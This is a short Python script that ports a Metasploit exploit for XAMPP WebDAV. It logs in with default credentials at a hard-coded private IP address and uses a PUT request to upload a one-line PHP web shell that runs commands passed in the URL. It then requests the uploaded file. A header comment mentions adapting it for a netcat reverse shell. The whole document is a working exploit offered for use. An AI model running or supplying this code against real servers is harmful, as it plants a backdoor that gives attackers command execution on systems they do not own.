#! /usr/bin/env python
# Python port of XAMPP WebDAV PHP Upload (Metasploit)
# From https://www.exploit-db.com/exploits/18367/
# 2016, atomik
# BSD-3-Clause
#Modifiled for use netcat to reverse shell

from requests import put, get
from requests.auth import HTTPDigestAuth
import sys

print "\nXAMPP WebDAV PHP Upload Exploit\nPython port by atomik"
url      = "http://192.168.22.55/webdav/aaa3.php"
username = "wampp"
password = "iamdifferent"
payload = """<?php system($_GET['cmd']); ?>"""

# r = put(url, data=payload, auth=HTTPDigestAuth(username, password))
r = put(url, data=payload, auth=(username, password))

if (r.status_code is not 201) and (r.status_code is not 204):
    print "Failed to upload file"
    sys.exit(1)

print "\nAttempting to execute payload\n"
r = get(url)
print r.content
